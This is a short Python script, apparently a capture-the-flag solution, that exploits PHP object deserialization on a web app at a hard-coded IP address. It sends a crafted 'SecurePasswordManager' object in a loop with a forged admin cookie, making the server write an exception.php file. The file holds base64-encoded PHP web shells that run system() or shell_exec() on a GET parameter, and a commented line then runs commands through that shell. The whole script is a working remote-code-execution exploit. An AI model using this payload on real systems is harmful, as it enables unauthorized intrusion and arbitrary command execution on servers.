#!/usr/bin/python3
import time
import requests
import sys

url_base = "http://157.230.107.175:8001/"

cont1 = '"PD9waHAgZWNobyBzY2FuZGlyKCIuLi8uLi8uLiIpWzNdOz8+"'
cont2 = '"3c3f706870206563686f20313b206563686f20323b203f3e"'
cont3 = '"PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+    "' #or
contj = '"PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjIl0pPz4="'

payload = 'O:21:"SecurePasswordManager":2:{s:8:"filename";s:13:"exception.php";s:7:"content";s:48:'+cont3+';}'

r = requests.get(url_base)
cookies = {'user':'admin', 'PHPSESSID':'hosfvov8r947ikuq4pam2vp37m'}

while (1):
	time.sleep(1)
	r = requests.get(url_base +'?data='+payload,cookies=cookies)

#r = requests.get(url_base+"tmp/hosfvov8r947ikuq4pam2vp37m/exception.php?c="+sys.argv[1],cookies=cookies)

#print(r)
